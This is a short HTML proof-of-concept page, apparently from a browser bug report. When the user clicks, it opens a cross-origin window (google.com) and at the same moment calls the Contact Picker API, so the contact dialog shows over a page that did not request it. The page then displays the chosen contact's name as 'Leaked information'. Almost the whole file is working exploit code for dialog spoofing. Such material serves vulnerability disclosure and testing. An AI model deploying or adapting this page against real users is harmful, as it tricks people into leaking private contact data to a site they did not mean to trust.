<!DOCTYPE html>
<html lang="en">
    <head>
        <title>PoC</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <script>
            onclick = async () => {
                (async () => {
                    let contacts = await navigator.contacts.select(["name"], {});
                    document.write(`
                        <h1>
                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
                        </h1>
                    `);
                })();
                open("https://www.google.com", "PoC", "_blank");
            }
        </script>
    </head>  
    <body>
        <br><br><br>
        <center>
            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
        </center>
    </body>
  </body>
</html>
